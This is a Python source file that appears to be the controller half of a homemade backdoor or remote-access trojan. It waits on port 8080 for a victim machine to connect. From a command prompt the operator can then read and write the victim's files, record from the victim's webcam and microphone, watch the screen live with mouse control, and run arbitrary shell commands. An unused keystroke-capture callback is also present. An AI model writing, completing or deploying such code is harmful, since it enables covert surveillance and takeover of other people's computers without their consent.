#10.81.68.126
#10.81.68.124
import os
import socket
import pygame
import pyautogui
import time
import keyboard
import traceback

from pygame.constants import MOUSEBUTTONUP


host = socket.gethostbyname(socket.gethostname())
port = 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ADDR = host, port
s.bind(ADDR)


content = ""
letters = ""
def callback(event):
    global letters
    output = event.name
    letters += output
    

#function for reciving and displaying the clients screen 
def screenshare():
    #starts a pygame window
    #this is where the image is going to be displayed
    pygame.init()
   #gets the size to make window the right size
    w, h = pyautogui.size()
   
    win = pygame.display.set_mode((w,h))
   #function what redraws the window with the most up to date information
    def redraw(win, sc, ms, m_m):
        win.blit(sc,(0,0))
        #if the user has acctivated mouse mode then it will draw this
        if ms == True:
            win.blit(m_m,(50,50))

        pygame.display.update()
    #this makes it so the while loop runs at a set speed, in this case 60 frames per seconds
    fps = 60
    Clock = pygame.time.Clock()
    #main function
    def main():
        run = True
        #value store the times message has not been recived
        value = 0
        timer = 0
        # mouse_activated is the mouse mode. This bind the clients mouse to the masters mouse if it is true
        mouse_activated = False 
        #loads in the images for displaying
        m_m = pygame.image.load(r"C:\Users\siaaa013\m_m.png")
        sc = pygame.image.load(r"C:\Users\siaaa013\Documents\Programering\python\backdoor\connecting_image.png")
        #main loop
        while run:
            Clock.tick(fps)
            #checks evry event. if the event is closing a window it will end the pygame prosess.
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    run = False

            keys = pygame.key.get_pressed()
            #this is in a try: except: because if it fails it would not crash the program.
            try:
                #sets a max wait of 9 seconds before it times out
                s.settimeout(9)
                #send the command "send size" to the client
                conn.send("send size".encode())
                #trys to get the size back and convert it to an integer
                size = int(conn.recv(1024).decode())
                #prints the size
                print("got size :", size)
                #sends the size back to indicate that the client should send the picture/screenshot
                #if it is not the write size the client will not send the image. this helps not reciving vcorrupt images
                conn.sendall(str(size).encode())
                #recives screenshot
                screenshot = conn.recv(size)
                print("got image")
                #opens a file and writes the image in to the file
                image = open("image.png", "wb")
                image.write(screenshot)
                image.close()
                #resets the connection timer
                value = 0
                print("Saved Image")
                #if the mouse mode is acctivated
                if mouse_activated == True:
                    #gets the position of the masters mouse
                    x,y = pyautogui.position()
                    #sends it over to the client
                    conn.send((str(x) + " " + str(y)).encode())
                    #checks if the master has released the mouse button
                    for event in keys:
                        if pygame.MOUSEBUTTONUP:
                            #sends message to the client to click
                            conn.send("click".encode())
                #if "å" is pressed it acctivates or deacctivates mouse mode
                #TODO make it be a button on the screen insted
                if keyboard.is_pressed("å"):
                    if mouse_activated == True:
                        mouse_activated = False
                    else:
                        mouse_activated = True
            except Exception:
                #if somethig whent wrong
                #incrises the timeout variable
                value +=1
                #prints the traceback
                print(traceback.format_exc())
            #if the timeout variable is 25 the program sleeps. this usualy fixes the problem
            if value == 25:
                print("we are sleeping")
                time.sleep(3)
            #it trys again if the variable is 50, but this should not happen.
            if value == 50:
                time.sleep(10)
            #if it gets to 100 it breaks from the main loop
            elif value == 100:
                print("connection timed out")
                run = False
            try:
                #reloads the now updated images
                sc = pygame.image.load(r"C:\Users\siaaa013\image.png")
            except:
                print("image failed to load")
                try:
                    #removes it if it is corupt
                    os.remove(r"C:\Users\siaaa013\image.png")
                except:
                    pass

            print("ja")
            #calls function that updates the window
            redraw(win, sc, mouse_activated, m_m)
               
        pygame.quit()
        #closes the window

    #calls the main function   
    main()

   

print("\n Server is currently running @", host)

print("\n Waiting for incomming connections")

s.listen(1)
conn, addr = s.accept()

valid_command = ["make file", "read file", "write file", "stream",]

print("\n", addr, "Has connected to the server succsessfully")

while 1:

    command = input("\n Command>>>")
    if command == "make file":
        user_command = input("\n file name>>>")
        conn.send(user_command.encode())
       
    elif command == "read file":

        user_command = input("\n file name>>>" )
        conn.send(user_command.encode())
   
    elif command == "write file":
        user_command = input("\n file name>>>")
        conn.send(user_command.encode())
       
    elif command == "send file":
        file = conn.recv(4128)

    elif command == "camrec":
        cmdcam = "webcamrec"
        conn.send(cmdcam.encode())

    elif command == "micrec":
        cmdmic = "microphonerec"
        conn.send(cmdmic.encode())

    elif command == "stream":
        conn.send(command.encode())
        user_command = conn.recv(1024)
        user_command = user_command.decode()
        if user_command == "stream":
            directory = os.getcwd()
            screenshare()
           
    elif command == "bat":
        conn.send((command.encode()))
        run = True
        while run:
            user_command = input("Bash Command>>>")
            if user_command == "kill" :
                run = False
            conn.send(user_command.encode())
    else:
        print("\n This is not a valid command")
